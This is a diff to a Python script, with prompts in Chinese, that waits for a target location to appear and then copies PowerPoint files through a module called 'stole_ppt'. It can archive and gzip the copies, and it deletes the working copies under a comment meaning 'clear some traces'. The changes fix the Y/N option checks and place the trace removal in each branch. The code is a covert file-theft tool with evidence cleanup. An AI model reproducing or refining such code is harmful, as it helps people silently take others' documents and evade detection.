@@ -101,7 +101,7 @@ while True:
         break
 
 
-if is_tar:
+if is_tar == "Y":
     print("既然已经打包了，文件可以进一步压缩为 *.gz 类型")
     print("gzip 压缩率较高，压缩速度也不错，要试试吗")
     while True:
@@ -115,6 +115,8 @@ if is_tar:
         elif is_zip == "N":
             zip_path = ""
             break
+else:
+    is_zip = "N"
 
 
 while True:
@@ -125,14 +127,16 @@ while True:
     if smell_res["target_exist"]:
         find_ppt.layer_trans(root, total_layer)
         copy_folder = stole_ppt.copy_ppt(target_path=output_path)
-        if is_tar and is_zip:
+        if is_tar == "Y" and is_zip == "Y":
             stole_ppt.tar_ppt(copy_folder, tar_path)
             stole_ppt.zip_ppt(tar_path, tar_path+".gz", choice="gz")
+            # 清除一些痕迹
             os.remove(tar_path)
-        elif is_tar and not is_zip:
+            shutil.rmtree(copy_folder)
+        elif is_tar == "Y" and is_zip == "N":
             stole_ppt.tar_ppt(copy_folder, tar_path)
-        # 清除一些痕迹
-        shutil.rmtree(copy_folder)
+            # 清除一些痕迹
+            shutil.rmtree(copy_folder)
         break
     else:
         time.sleep(int(float(check_time)))
